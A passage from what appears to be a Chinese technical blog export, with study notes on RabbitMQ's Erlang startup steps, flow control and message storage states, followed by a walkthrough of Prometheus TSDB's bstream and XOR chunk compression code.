(1).执行rabbit_registry:register(exchange, &lt;&lt;”direct”&gt;&gt;, rabbit_exchange_type_direct)函数 ​ RabbitMQ系统exchange交换机direct类型向rabbit_registry进行注册 14.rabbit_exchange_type_fanout启动步骤 ​ (1).执行rabbit_registry:register(exchange, &lt;&lt;”fanout”&gt;&gt;, rabbit_exchange_type_fanout)函数 ​ RabbitMQ系统exchange交换机fanout类型向rabbit_registry进行注册 15.rabbit_echange_type_headers启动步骤 ​ (1).执行rabbit_registry:register(exchange, &lt;&lt;”headers”&gt;&gt;, rabbit_exchange_type_headers)函数 ​ RabbitMQ系统exchange交换机headers类型向rabbit_registry进行注册 16.rabbit_exchange_type_topic启动步骤 ​ (1).执行rabbit_registry:register(exchange, &lt;&lt;”topic”&gt;&gt;, rabbit_exchange_type_topic)函数 ​ RabbitMQ系统exchange交换机topic类型向rabbit_registry进行注册 ​ %% rabbit_topic_trie_node表里存储的是节点数据(里面存储的是topic_trie_node数据结构，所有的路由信息都是从root节点出发) ​ %% rabbit_topic_trie_edge表里存储的是边数据(里面存储的是topic_trie_node数据结构，边的数据结构里面存储的有路由信息的单个单词) ​ %% rabbit_topic_trie_binding表里存储的是某个节点上的绑定信息(里面存储的是topic_trie_binding数据结构) ​ %% 比如路由信息hello.#.nb： ​ %% 1.有四个节点，第一个节点始终是root节点，然后是其他三个节点， ​ %% 2.有三条边信息，每个边数据结构里面带有对应的单词hello，#，nb ​ %% 3.在第四个节点上存在绑定的队列名字 17.rabbit_mirror_queue_mode_exactly启动步骤(高可用队列相关) ​ (1).执行rabbit_registry:register(ha_mode, &lt;&lt;”exactly”&gt;&gt;, rabbit_mirror_queue_mode_exactly)函数 18.rabbit_mirror_queue_mode_nodes启动步骤(高可用队列相关) ​ (1).执行rabbit_registry:register(ha_mode, &lt;&lt;”nodes”&gt;&gt;, rabbit_mirror_queue_mode_nodes)函数 19.rabbit_priority_queue启动步骤(启动RabbitMQ系统优先级队列) ​ (1).执行rabbit_priority_queue:enable()函数 ​ 该步骤是允许RabbitMQ系统的队列支持简单的优先级队列 20.rabbit_epmd_monitor启动步骤 ​ (1).执行rabbit_sup:start_restartable_child(rabbit_epmd_monitor)函数 ​ 该进程主要用来监视epmd进程的存在，有可能epmd进程被无端的删除掉，则该进程发现epmd进程被kill掉后，会立刻进行对epmd进程进行重启 21.guid_generator启动步骤(生成独一无二的各种ID对应的模块) ​ (1).执行rabbit_sup:start_restartable_child(rabbit_guild)函数 ​ RabbitMQ系统中生成唯一16为字符串ID的进程 22.rabbit_node_monitor启动步骤 ​ (1).执行rabbit_sup:start_restartable_child(rabbit_node_monitor)函数 ​ RabbitMQ系统中节点管理的进程，该进程会保留集群中的其他节点以及它们对应的GUID，同时节点的删除，增加都会根据该进程通知集群中的其他节点 23.delegate_sup启动步骤(多次的向远程节点发送消息，则此代理会将发送到同一个远程节点的多个消息操作统一成一个发送消息操作) ​ (1).执行rabbit:boot_delegate()函数 ​ RabbitMQ系统中的代理进程监督树，这些代理进程主要用来多次对远程的某个节点进行多次访问，用了代理进程后，可以将多次访问变成一次访问操作 24.rabbit_memory_monitor启动步骤 ​ (1).执行rabbit_sup:start_restartable_child(rabbit_memory_monitor)函数 ​ rabbit_memory_monitor进程统计RabbitMQ系统中内存使用情况，它会收到当前系统中所有的消息队列统计的数字，同时将内存使用速率返回给各个消息 ​ 队列 25.empty_db_check启动步骤(如果RabbitMQ系统是第一次启动则需要插入默认的账号，账号密码，vhost等默认信息) ​ (1).执行rabbit:maybe_insert_default_data()函数 ​ RabbitMQ系统是第一次启动则需要插入默认的账号，账号密码，vhost等默认信息 26.rabbit_mirror_queue_misc启动步骤(高可用队列相关) ​ (1).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-mode”&gt;&gt;, rabbit_mirror_queue_misc)函数 ​ (2).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-params”&gt;&gt;, rabbit_mirror_queue_misc)函数 ​ (3).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-sync-mode”&gt;&gt;, rabbit_mirror_queue_misc)函数 ​ (4).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-promote-on-shutdown”&gt;&gt;, rabbit_mirror_queue_misc)函数 27.rabbit_policies启动步骤 ​ (1).执行rabbit_policies:register()函数 ​ 该启动步骤主要是向rabbit_registry进程注册policy_validator类型的相关数据(主要包括是消息队列的参数类型) 28.rabbit_policy启动步骤 ​ (1).执行rabbit_policy:register()函数 ​ 该启动步骤主要是向rabbit_registry进程注册runtime_parameter类型的相关数据 ​ 该模块是队列和交换机的公用配置参数模块的处理模块 29.recovery启动步骤 ​ (1).执行rabbit:recover()函数 ​ 该启动步骤主要是恢复所有的持久化队列，将所有的持久化队列进程启动起来，将持久化的交换机信息恢复到非持久化的mnesia数据库表中， ​ 将持久化的绑定信息恢复到非持久化的绑定数据库表中 30.mirrored_queues启动步骤(高可用队列相关) ​ (1).执行rabbit_mirror_queue_misc:on_node_up()函数 31.log_relay启动步骤(主要是将error_logger事件中心的事件发布到&lt;&lt;”amq.rabbit.log”&gt;&gt;交换机对应的队列里) ​ (1).执行rabbit_sup:start_child(rabbit_error_logger_lifecycle, supervised_lifecycle, [rabbit_error_logger_lifecycle, {rabbit_error_logger, start, []}, ​ {rabbit_error_logger, stop, []}]]}}函数 ​ 该启动步骤会在rabbit_sup监督进程下启动名字为rabbit_error_logger_lifecylce监督进程，该rabbit_error_logger_lifecylce监督进程执行 ​ supervised_lifecycle:start_link函数，该监督进程的回调初始化函数会执行rabbit_error_logger:start()函数，该函数启动rabbit_error_logger进程， ​ 该进程会处理error_logger事件中心发布的事件，然后将事件依次发布到&lt;&lt;”amq.rabbit.log”&gt;&gt;名字对应的交换机上(&lt;&lt;”amq.rabbit.log”&gt;&gt;交换机会在 ​ rabbit_error_logger事件处理进程启动的时候创建) 32.background_gc启动步骤 ​ (1).执行rabbit_sup:start_restartable_child, [background_gc])函数 ​ (该进程启动一个定时器，定时的对RabbitMQ系统进行垃圾回收，定时器的间隔时间是不断变化的，如果垃圾回收的时间过长，则增加时间间隔，反之则减少垃圾回收的时 间间隔) 33.networking启动步骤 ​ (1).执行rabbit_networking:boot()函数 ​ 根据配置文件中的端口，启动网络连接进程树，等待客户端通过Socket连接过来 34.direct_client启动步骤 ​ (1).执行rabbit_direct:boot()函数 ​ 启动rabbit_direct_client_sup监督进程，该监督进程的动态启动子进程是执行{rabbit_channel_sup, start_link, []} ​ 所有客户端的连接进程都是启动在rabbit_direct_client_sup监督进程下 35.notify_cluster启动步骤 ​ (1).执行rabbit_node_monitor:notify_node_up()函数 ​ 通知RabbitMQ集群系统当前节点启动 application： erlang启动application，mnesia是rabbitmq的数据库，用于存储队列消息等持久化信息等。 erl&gt; application:start(mnesia). mnesia: erl&gt;application.start(os_mon). os_mon，主要是rabbitmq os_mon，系统监控进程 erl&gt;application.start(sasl). sasl，sasl的一个重要功能便是可以记录系统进程相关日志，如进程启动、结束、崩溃错误等信息 erl&gt;application.start(rabbit). rabbit，rabbitmq的主进程。 rabbitmq中有很多application，可以认为每个插件就是一个erlang的application应用。 amqp_client是插件amqp_client的客户端的application，用于创建连接。 rabbitmq_management等其他的是一些插件的application。我们暂时不做详细的分析了。 rabbit application有比较多的进程，主要的来解释以下： background_gc_sup，MQ中的垃圾gc收集器，采用的erlang原生的垃圾收集机制，标记清理的方式来进程gc。 delegrate代理进程，这些代理进程主要用来多次对远程的某个节点进行多次访问，用了代理进程后，可以将多次访问变成一次访问操作 file_handle_cache比较重要的，在MQ中主要用于文件读写操作，进行持久化操作。 mnesia_sync同步数据到磁盘的进程，该操作步骤是启动当前RabbitMQ节点的Mnesia数据库，同时将本节点同集群中的其他节点连接起来，并将集群中的数据同自己本地的数据进行同步，然后将RabbitMQ系统所有的数据库表启动起来。 rabbitmq_alarm，对磁盘监控之后，告警的进程 rabbit_disk_monitor_sup，对磁盘使用率监控进程 epmd_monitor_sup，epmd监控 error_logger_lifecycle，日志生命周期 rabbit_event_sup,所有的事件都是发布到rabbit_event事件管理器中，只要有rabbit_event事件管理器的事件处理进程，则该进程就能接收到所有的事件 rabbit_guid_sup,生成唯一16为字符串ID rabbit_memory_monitor_sup，内存监控 rabbit_node_monitor_sup，节点监控 rabbit_registry，内部各种定义类型注册处理模块的进程，该进程启动了rabbit_registry名字的一个ETS表，用来存储分类，类型名字，以及处理模块的数据 vm_memory_monitor：vm_memory监控 worker_pool_sup:进程池管理进程 rabbit_direct_client_sup监督进程 msg_store_persistent,msg_store_transient：一个用于持久消息的存储，一个用于内存不够时，将存储在内存中的非持久化数据转存到磁盘中。所有队列的消息的写入和删除最终都由这两个进程负责处理，而消息的读取则可能是队列本身直接打开文件进行读取，也可能是发送请求由msg_store_persisteng/msg_store_transient进程进行处理 rabbit_amqqueue_process：rabbit队列进程，该进程一般在rabbitmq创建队列时被创建，其主要负责消息的接收/投递逻辑 源码结构项目主要代码结构，主要代码都在src目录中； 讲几个其中的重要的知识点吧。ORZ； 1）镜像队列数据同步过程： GM：Guaranteed(保证) Multicast(组播)，用于msg的广播进程，在同步数据的时候比较重要。 2）流控：rabbitmq在msg的分发的时候对消息的传播速率都做了一定的控制，这样能够保证系统和MQ的稳定性。同时可以提高性能和吞吐。 credit flow机制： MQ主要是通过credit flow的机制来实现流量控制的。通过credit 描述一个元组来进行{InitialCredit，MoreCreditAfter}，对于消息的发送者，credit 开始于InitialCredit当每个消息发送的时候进行递减。消息的接收者可以授权更多的credit给发送者，当正在接受到MoreCreditAfter消息，通过给发送着一个{bump_credit，…}控制消息。发送者应该通过这个消息 handle_bump_msg/1。发送者会阻塞当每次检查clocked/0函数都是为0，如果一个进程即是发送者也是接收者，当他被阻塞的时候，那么他就不会授权更多的credit给他的发送者。因此只有需要检查blocked/0的进程才需要去读取网络sockets。 %% RabbitMQ系统设置的当前进程能够发送给下游进程消息的最大数为200 %% RabbitMQ系统设置下游进程在接收上游进程发送的50条消息后，需要通知上游进程增加能够向下游进程发送消息的数量上限 %% 每次通知上游进程增加向下游进程的发送消息的数量也为50 3）autoheal heal: 治愈 为了去autoheal我们需要： 找到获胜的分区 其他分区停止所有的节点 等待他们所有都停止 启动他们 过程： 当Mnesia检测出集群出现分区，则从集群中找到第一个节点作为leader节点进行autoheal操作 Leader节点找出胜利进程和失败进程，胜利者节点收到Leader节点发送过来通知自己成为胜利者的消息 胜利者节点通知所有的失败者进程自己是Winner节点，然后失败者节点新启动一个进程进行rabbit应用的重启 当胜利者节点收取到了所有失败者节点的停止后，立刻向所有失败者节点上的新启动的进程发送autoheal_safe_to_start消息，通知失败者节点重新启动rabbit应用 Leader进程向胜利者进程发送report_autoheal_status消息 胜利者进程通知Leader进程autoheal操作结束 4）消息存储过程 rabbit_channel进程确定了消息将要投递的目标队列，rabbit_amqqueue_process是队列进程，每个队列都有一个对应的进程，实际上rabbit_amqqueue_process进程只是提供了逻辑上对队列的相关操作，他的真正操作是通过调用指定的backing_queue模块提供的相关接口实现的，默认情况该backing_queue的实现模块为rabbit_variable_queue。 对于普通的没有设置优先级和镜像的队列来说，backing_queue的默认实现是rabbit_variable_queue，其内部通过5个子队列Q1、Q2、Delta、Q3和Q4来实现这4个状态的转换 其中Q1、Q4只包含alpha状态的消息，Q2和Q3包含Beta和gamma状态的消息，Delta只包含delta状态的消息 在rabbit中，队列中的消息可能会处理以下四种状态： alpha：消息内容以及消息在队列中的位置（消息索引）都保存在内存中； beta：消息内容只在磁盘上，消息索引只在内存中； gamma：消息内容只在磁盘上，消息索引在内存和磁盘上都存在； delta：消息的内容和索引都在磁盘上。 注意：对于持久化消息，消息内容和消息索引都必须先保存在磁盘上，然后才处于上述状态中的一种。其中gamma很少被用到，只有持久化的消息才会出现这种状态。 rabbit提供这种分类的主要作用是满足不同的内存和CPU需求。alpha最耗内存，但很少消耗CPU；delta基本不消耗内存，但是要消耗更多的CPU以及磁盘I/O操作（delta需要两次I/O操作，一次读索引，一次读消息内容；delta及gamma只需要一次I/O操作来读取消息内容）。 rabbit在运行时会根据统计的消息传送速度定期计算一个当前内存中能够保存的最大消息数量（target_ram_count），如果内存中的消息数量大于这个数量，就会引起消息的状态转换，转换主要两种：alpha -&gt; beta， beta -&gt; delta。alpha -&gt; beta的转换会将消息的内容写到磁盘（如果是持久化消息，在这一步转换后，消息将会处于gamma状态），beta -&gt; delta的转换会更进一步减少内存消耗，将消息索引也写到磁盘。 总结MQ中还有很多重要的特性，还需要后续继续分析学习了。。。。todo…","categories":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://www.yorzorzy.xyz/categories/rabbitmq/"}],"tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://www.yorzorzy.xyz/tags/rabbitmq/"}]},{"title":"tsdb源码学习","slug":"tsdb源码学习","date":"2020-10-10T02:11:50.157Z","updated":"2020-10-10T02:09:39.000Z","comments":true,"path":"2020/10/10/tsdb源码学习/","link":"","permalink":"http://www.yorzorzy.xyz/2020/10/10/tsdb%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"tsdb源码学习tsdb项目结构： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869├── Documentation│ └── format│ ├── chunks.md│ ├── index.md│ └── tombstones.md├── LICENSE├── README.md├── block.go├── block_test.go├── chunkenc│ ├── bstream.go│ ├── chunk.go│ ├── chunk_test.go│ └── xor.go├── chunks│ └── chunks.go├── cmd│ └── tsdb│ ├── Makefile│ ├── README.md│ └── main.go├── compact.go├── compact_test.go├── db.go├── db_test.go├── encoding_helpers.go├── fileutil│ ├── dir_unix.go│ ├── dir_windows.go│ ├── fileutil.go│ ├── mmap.go│ ├── mmap_unix.go│ ├── mmap_windows.go│ ├── preallocate.go│ ├── preallocate_darwin.go│ ├── preallocate_linux.go│ ├── preallocate_other.go│ ├── sync.go│ ├── sync_darwin.go│ └── sync_linux.go├── head.go├── head_test.go├── index│ ├── encoding_helpers.go│ ├── index.go│ ├── index_test.go│ ├── postings.go│ └── postings_test.go├── labels│ ├── labels.go│ ├── labels_test.go│ └── selector.go├── querier.go├── querier_test.go├── test│ ├── conv_test.go│ ├── hash_test.go│ └── labels_test.go├── testdata│ └── 20kseries.json├── testutil│ └── testutil.go├── tombstones.go├── tombstones_test.go├── tsdbutil│ ├── buffer.go│ └── buffer_test.go├── wal.go└── wal_test.go bstreambstream结构体就是Prometheus TSDB中的基础组件之一，它是对 byte切片的封装，提供了读写bit位的功能，主要用于读写时序数据。bstream结构体其核心字段定义如下： stream（[]byte类型）：用于记录数据的byte切片。 count（uint8类型）：在写入数据的时候，是逐个byte进行操作的，count字段用来记录当前byte中有多少个bit位是可以写入的，在读取数据的时候，表示当前byte中有多少个bit位是可读的。也就是说，count字段类似于控制写入/读取位置的下标。 12345// bstream is a stream of bits.type bstream struct &#123; stream []byte // the data stream count uint8 // how many bits are valid in current byte&#125; 首先是writeByte()方法，它提供了写入一个byte的功能，其工作原理如图2-2所示。在图2-3（a）中每次正好写入stream切片的一个元素。需要注意图2-3（b）中展示的这种场景，待写入byte值的高位（10）会写入到bstream.stream切片中的第二个byte元素中，低位（100101）会写入到第三个byte元素中。 bstream.writeByte()方法的具体实现如下。注意，在通过writeByte()方法写入byte之后，bstream.count字段的值是不需要改变的。 123456789101112131415161718func (b *bstream) writeByte(byt byte) &#123; if b.count == 0 &#123; //当前bstream已经完整写完了一个byte, 需要向stream切片中追加一个新的byte元素来完成此次写入 b.stream = append(b.stream, 0) b.count = 8 &#125; i := len(b.stream) - 1 // 再stream切片末尾写入byt // fill up b.b with b.count bits from byt b.stream[i] |= byt &gt;&gt; (8 - b.count) //如果stream切片中最后一个byte元素剩余的bit位不足8，则需要追加一个byte写入byt剩余的bit位 b.stream = append(b.stream, 0) i++ b.stream[i] = byt &lt;&lt; b.count&#125; bstream.writeBit()方法负责完成一个bit的写入，同时也会更新bstream.count字段，具体实现如下所示： 123456789101112func (b *bstream) writeBit(bit bit) &#123; if b.count == 0 &#123; // 当前bstream已经完整写完一个byte，需要向stream切片中追加新的byte元素来完成此次写入 b.stream = append(b.stream, 0) b.count = 8 &#125; i := len(b.stream) - 1 // 最后一个byte元素的下标 if bit &#123; // 如果bit为1，则需要将该byte元素中对应的位设置为1，如果为0，则不需要设置 b.stream[i] |= 1 &lt;&lt; (b.count - 1) &#125; b.count-- // 写入一个bit之后，更新当前byte可用位的数量&#125; 另外，writeBits()方法实现了写入一个uint64值的功能，当该值所占的bit位数超过8个时，会首先调用writeByte()方法，按照每8位一个byte的方式写入，然后再调用writeBit()方法写入剩余不足8位的bit值，其实现比较简单，这里不再展开详细介绍。 介绍完bstream中提供的写入方法之后，下面继续分析bstream中读取相关的方法。首先是readByte()方法，该方法负责读取一个8位的byte，其大致原理如图2-4所示： bstream.readByte()方法实现如下： 12345678910111213141516171819202122func (b *bstream) readByte() (byte, error) &#123; // 检测当前stream切片是否为空(略) // 读取数据时会首先将bstream.count初始化为8，所以会先读取stream切片中的第一个元素 if b.count == 8 &#123; b.count = 0 // 将count更新为0 return b.stream[0], nil &#125; if b.count == 0 &#123; // count为0表示当前stream切片中的第一个元素已经被读取完毕 b.stream = b.stream[1:] // 截掉stream切片中第一个byte元素 // 重新检测stream切片是否为空(略) return b.stream[0], nil // 返回stream切片中的第一个byte元素 &#125; // 如果count不等于0或8，则此次读取的8个bit需要跨两个byte元素 byt := b.stream[0] &lt;&lt; (8 - b.count) // 从第一个byte元素中读取剩余可读取的bit b.stream = b.stream[1:] // 截掉stream切片中的第一个byte元素 // 检测stream切片是否为空(略) // 截断之后，再次读取stream中第一个byte元素，凑齐8个bit byt |= b.stream[0] &gt;&gt; b.count return byt, nil&#125; 再来看bstream.readBit()方法，它主要实现了读取单个bit位的功能，具体实现如下所示： 123456789101112131415161718func (b *bstream) readBit() (bit, error) &#123; if len(b.stream) == 0 &#123; return false, io.EOF &#125; // 检测当前stream切片是否为空(略) if b.count == 0 &#123; // count为0表示stream切片中的第一个byte元素已读取完毕 b.stream = b.stream[1:] // 截掉第一个byte元素 if len(b.stream) == 0 &#123; return false, io.EOF &#125; b.count = 8 // 将count字段重置为8 &#125; // 读取第一个bit位 d := (b.stream[0] &lt;&lt; (8 - b.count)) &amp; 0x80 b.count-- // 递减count字段，表示该byte中剩余可读取的bit数 return d != 0, nil&#125; 另外，与writeBits()方法对应的是readBits()方法，它实现了一次读取多个bit位的功能，当读取的bit个数超过8个，则首先通过readByte()方法按照byte进行读取，之后当需要读取的bit个数不足8个时，则会调用readBit()方法逐个读取bit值，其实现比较简单，这里不再展开详细介绍。 Chunk接口在上一篇文章中提到，在磁盘存储中每个block中的时序数据存储在chunk文件中。Prometheus TSDB中对应的抽象是Chunk接口，它表示一组时序点的集合，其定义如下所示。Chunk接口有两个紧密相关的接口：Append接口和Iterator接口，我们可以通过该Append接口向Chunk中追加时序点，也可以通过Iterator接口迭代Chunk中存储的时序点。 1234567type Chunk interface &#123; Bytes() []byte // 存储时序点的byte切片，通过前面介绍的bstream完成读写 Encoding() Encoding // 编码类型，目前只有XOR这一种编码类型 Appender() (Appender, error) // 返回该Chunk关联的Appender实例 Iterator() Iterator // 返回该Chunk关联的Iterator实例 NumSamples() int // 返回该Chunk中保存时序点的个数&#125; 这里的Append接口和Iterator接口的定义都比较简单，如下所示。Append接口中只有一个Append()方法，用于向Chunk实例中追加一个时序点，其接收的参数分别是时序点的timestamp和value值。Iterator与我们常见的迭代器类似。 123456789type Appender interface &#123; Append(int64, float64) // 每个时序点都是有对应的timestamp和value值组成的&#125;type Iterator interface &#123; At() (int64, float64) // 返回当前时序点的timestamp和value值 Err() error // 返回迭代过程中发生的异常 Next() bool // 检测后续是否有时序点可以继续迭代&#125; XORChunk实现XORChunk是Prometheus TSDB实现中Chunk接口的唯一实现，它只有b（*bstream类型）一个字段，主要用于存储时序数据。XORChunk关联的Appender接口实现为xorAppender，其核心字段如下： b（*bstream）：bstream实例，存储写入的时序点的数据。 t（int64类型）：记录上次写入时序点对应的timestamp。 v（float64类型）：记录上次写入时序点对应的value值。 tDelta（uint64类型）：记录当前点与前一个点的timestamp差值。 leading（uint8）：记录当前XOR运算结果中前置”0”的个数。 trailing（uint8）：记录当前XOR运算结果中后置”0”的个数。 XORChunk中只有两个方法需要介绍，一个是XORChunk.iterator()方法，用于创建xorIterator实例，xorIterator实例用于迭代XORChunk中的时序点，iterator()方法的具体实现如下所示： 12345678func (c *XORChunk) iterator() *xorIterator &#123; return &amp;xorIterator&#123; // bstream中前两个byte元素存储的是XORChunk中时序点的个数，所以这里要跳过 br: newBReader(c.b.bytes()[2:]), // 读取bstream中前两个byte元素，获取XORChunk实例中存储的时序点的个数 numTotal: binary.BigEndian.Uint16(c.b.bytes()), &#125;&#125; 另一个方法是XORChunk.Appender()方法，用于创建xorAppender实例，xorAppender负责向该XORChunk实例中追加时序点，Appender()方法的具体实现如下所示： 123456789101112131415161718func (c *XORChunk) Appender() (Appender, error) &#123; it := c.iterator() // 创建xorIterator迭代器 for it.Next() &#123; // 迭代XORChunk中已有的全部时序点，直至结束，这样才能得到可以写入的正确状态 &#125; a := &amp;xorAppender&#123; // 根据xorIterator迭代器的状态创建xorAppender实例 b: c.b, t: it.t, v: it.val, tDelta: it.tDelta, leading: it.leading, trailing: it.trailing, &#125; if binary.BigEndian.Uint16(a.b.bytes()) == 0 &#123;// 如果是空XORChunk会初始化leading a.leading = 0xff &#125; return a, nil&#125; xorAppender下面来看xorAppender.Append()方法的具体实现，其参数是待写入时序点的timestamp和value值，这里会按照前面介绍的delta-of-delta时间戳压缩方式存储timestamp，按照XOR压缩方式存储value值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253func (a *xorAppender) Append(t int64, v float64) &#123; var tDelta uint64 // XORChunk会使用bstream中前两个byte记录已写入的时序点的个数，这里就是读取该值 num := binary.BigEndian.Uint16(a.b.bytes()) if num == 0 &#123; // 每个XORChunk中需要完整记录第一个点的timestamp和value值 buf := make([]byte, binary.MaxVarintLen64) // 创建一个足够存储timestamp的byte切片 for _, b := range buf[:binary.PutVarint(buf, t)] &#123;// 将timestamp完整写入到bstream中 a.b.writeByte(b) &#125; a.b.writeBits(math.Float64bits(v), 64) // 将第一个时序点的value值写入到bstream中 &#125; else if num == 1 &#123; // 根据num判断，此次写入的是第二个时序点 tDelta = uint64(t - a.t) // 计算该点与前一个时序点的timestamp差值 // 下面将当前时序点与前一个时序点的timestamp差值写入到bstream中 buf := make([]byte, binary.MaxVarintLen64) for _, b := range buf[:binary.PutUvarint(buf, tDelta)] &#123; a.b.writeByte(b) &#125; // 计算该时序点与前一个时序点value值的XOR值，并按照前面介绍的压缩方式记录到bstream中， // xorAppender.writeVDelta()方法的具体实现在后面进行详细介绍 a.writeVDelta(v) &#125; else &#123; // 根据num判断，写入第三个以及之后的时序点 tDelta = uint64(t - a.t) // 计算该时序点与前一个时序点的timestamp差值 dod := int64(tDelta - a.tDelta) // 计算两个timestamp的dod（delta-of-delta）值 switch &#123; case dod == 0: // 如果dod差值为0，则只需要记录一个值为\"0\"的bit值 a.b.writeBit(zero) case bitRange(dod, 14): // 如果dod值在[-8191, 8192]范围中，则使用\"10\"作为标识，然后使用14个bit位存储dod值 a.b.writeBits(0x02, 2) a.b.writeBits(uint64(dod), 14) case bitRange(dod, 17): // 如果dod值在[-65535, 65536]范围中，则使用\"110\"作为标识，然后使用17个bit位存储dod值 a.b.writeBits(0x06, 3) a.b.writeBits(uint64(dod), 17) case bitRange(dod, 20): // 如果dod值在[-524287, 524288]范围中，则使用\"1110\"作为标识，然后使用20位存储dod值 a.b.writeBits(0x0e, 4) a.b.writeBits(uint64(dod), 20) default: // 如果dod值超出了上述返回，则使用\"1111\"作为标识，然后使用64个bit位存储dod值 a.b.writeBits(0x0f, 4) a.b.writeBits(uint64(dod), 64) &#125; a.writeVDelta(v) // 计算当前时序点与前一个时序点value值的XOR，并记录到bstream中 &#125; a.t = t // 更新t、v字段，记录当前时序点的时间戳和value值，为下一个时序点的写入做准备 a.v = v binary.BigEndian.PutUint16(a.b.bytes(), num + 1) // 更新该XORChunk已写入的点的个数 a.tDelta = tDelta // 记录当前时序点和前一个时序点的timestamp差值，为下次计算dod值做准备&#125; 通过对xorAppender.Append()方法的分析，我们了解了Prometheus TSDB对timestamp压缩的具体实现。接下来深入分析xorAppender.writeVDelta()方法，看Prometheus TSDB如何实现对value值的压缩。在writeVDelta()方法中，会计算当前时序点的value值与前一时序点的value值的XOR值，并根据XOR运算结果值中前置“0”和后置“0”的个数进行相应的压缩存储，具体的压缩规则在上一节已经介绍过了，这里重点看一下writeVDelta()方法对该压缩方式的实现。 123456789101112131415161718192021222324252627func (a *xorAppender) writeVDelta(v float64) &#123; // 计算当前时序点的value值与前一个时序点的value值之间的XOR值 vDelta := math.Float64bits(v) ^ math.Float64bits(a.v) if vDelta == 0 &#123; // 如果两个时序点的value值相同，则只写入一个值为\"0\"的bit位 a.b.writeBit(zero) return &#125; a.b.writeBit(one) // 写入控制位的第一个bit位，该位的值为\"1\" leading := uint8(bits.LeadingZeros64(vDelta)) // 返回vDelta中前置\"0\"的个数 trailing := uint8(bits.TrailingZeros64(vDelta)) // 返回vDelta中后置\"0\"的个数 if a.leading != 0xff &amp;&amp; leading &gt;= a.leading &amp;&amp; trailing &gt;= a.trailing &#123; // 该vDelta值的前置\"0\"和后置\"0\"的个数都比上一次写入得到XOR值多 a.b.writeBit(zero) // 写入控制位的第二个bit位，该位的值为\"0\" // 这里只需要记录除去前置\"0\"和后置\"0\"的部分即可 a.b.writeBits(vDelta&gt;&gt;a.trailing, 64-int(a.leading)-int(a.trailing)) &#125; else &#123; // 该vDelta值的前置\"0\"或是后置\"0\"比上一次写入得到的XOR值少 // 更新xorAppender的leading和trailing的字段，分别记录此次写入时得到的XOR值中前置\"0\" // 和后置\"0\"个数，这主要是为下一个时序点的写入做准备 a.leading, a.trailing = leading, trailing a.b.writeBit(one) // 写入控制位的第二个bit位，该位的值为\"1\" a.b.writeBits(uint64(leading), 5) // 用5个bit位来存储XOR值中前置0的数量 sigbits := 64 - leading - trailing a.b.writeBits(uint64(sigbits), 6) // 用6个bit位来存储XOR值中间非0位的长度 a.b.writeBits(vDelta&gt;&gt;trailing, int(sigbits)) // 存储中间非0位的值 &#125;&#125; xorIterator 到此为止，时序点的写入到Chunk实例的具体实现就分析完了。接下来要看的是xorIterator结构体，它是上一小节提到的Iterator接口的唯一实现，主要负责从Chunk中读取时序点，其核心字段如下所示： br（*bstream类型）：关联XORChunk实例中的b字段，存储了XORChunk实例中的时序数据。 numTotal（uint16类型）：关联XORChunk中存储的时序点的个数 numRead（uint16类型）：通过该xorIterator实例读取的时序点的个数。 t（int64类型）：当前读取的时序点的timestamp。 val（float64类型）：当前读取的时序点的value值。 leading（uint8类型）：当前读取到的XOR值的前置”0”个数。 trailing（uint8类型）：当前读取到的XOR值的后置”0”个数。 tDelta（uint64类型）：记录当前时序点与前一个时序点的timestamp的差值。 Next()方法是xorIterator的核心方法之一，它会根据当前读取的是第几个时序点决定如何返回正确的timestamp和value值，先来看timestamp的读取过程如下： 如果读取的是第一个时序点，则其timestamp和value值没有被压缩，直接读取即可。 如果读取的是第二个时序点，则需要第二个时序点与第一个时序点的timestamp差值，然后根据第一个点的timestamp以及timestamp差值，计算得出第二个时序点的timestamp。 如果读取的是第三个以及之后的时序点，则需要读取dod（delta-of-delta）值，然后根据前两个时序点的timestamp差值以及dod值，得出该时序点的timestamp。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455func (it *xorIterator) Next() bool &#123; // 检测迭代过程中是否出现异常，则返回false，停止整个迭代过程(略) // 检测numRead字段值，如果该xorIterator已经读取完全部的时序点，也会返回false(略) if it.numRead == 0 &#123; // 读取XORChunk实例中第一个时序点 t, err := binary.ReadVarint(it.br) // 从bstream中读取第一个时序点的完整timestamp v, err := it.br.readBits(64) // 从bstream中读取第一个时序点完整的value值 it.t = t // 更新t、val字段，记录当前时序点的timestamp和value值，在At()方法中会返回这两个值 it.val = math.Float64frombits(v) it.numRead++ // 递增已读取的点的个数 return true &#125; if it.numRead == 1 &#123; // 读取XORChunk中第二个时序点 // 从bstream中读取第二个点与第一个点的timestamp差值 tDelta, err := binary.ReadUvarint(it.br) it.tDelta = tDelta // 更新tDelta字段，记录timestamp差值 it.t = it.t + int64(it.tDelta) // 计算第二个时序点对应的timestamp // 读取第二个时序点的value值，xorIterator.readValue()方法的具体内容在后面详细介绍 return it.readValue() &#125; // 在读取XORChunk中第三个时序点以及之后的时序点时，会执行下面的逻辑 var d byte for i := 0; i &lt; 4; i++ &#123; // 首先读取标识位 d &lt;&lt;= 1 // 将d左移一位，为读取下一位做准备 bit, err := it.br.readBit() if bit == zero &#123; // 在读取标识位的过程中遇到\"0\"位，则表示标识位已经读取结束 break &#125; d |= 1 // 该bit位不为\"0\"，则将对应bit位设置为1 &#125; var sz uint8 // 后续需要读取多少个bit位，才能得到dod(delta-of-delta)值 var dod int64 switch d &#123; // 如果标识位为\"0\"，则表示时间戳的dod(delta-of-delta)值为0 case 0x00: // dod == 0 case 0x02: // 如果标识位为\"10\"，则表示时间戳的dod值在[-8191, 8192]范围中，需要读取14个bit位 sz = 14 case 0x06: // 如果标识位为\"110\"，则表示时间戳的dod值在[-65535, 65536]范围中，需要读取17个bit位 sz = 17 case 0x0e: // 如果标识位为\"1110\"，则表示时间戳的dod值在[-524287, 524288]范围中，需要读取20个bit位 sz = 20 case 0x0f: // 如果标识位为\"1111\"，则表示时间戳的dod值超出了上述范围，需要读取64个bit位 bits, err := it.br.readBits(64) dod = int64(bits) &#125; if sz != 0 &#123; // 